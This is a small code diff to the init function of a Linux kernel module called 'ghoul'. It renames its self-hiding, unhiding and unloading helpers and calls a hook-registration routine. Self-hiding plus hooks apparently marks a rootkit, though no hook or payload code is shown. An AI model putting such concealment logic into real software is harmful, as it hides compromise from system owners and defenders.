@@ -9,7 +9,7 @@ notrace static int __init ghoul_init(void)
     int err;
 
     pr_info("ghoul: inserted\n");
-    hide_self();
+    hide_module();
 
     err = register_hooks();
     if (err) {
@@ -20,9 +20,9 @@ notrace static int __init ghoul_init(void)
     goto out;
 
 unload:
-    // show self and unload
-    show_self();
-    unload_self();
+    // show module and unload
+    show_module();
+    unload_module();
 out:
     return 0;
 }
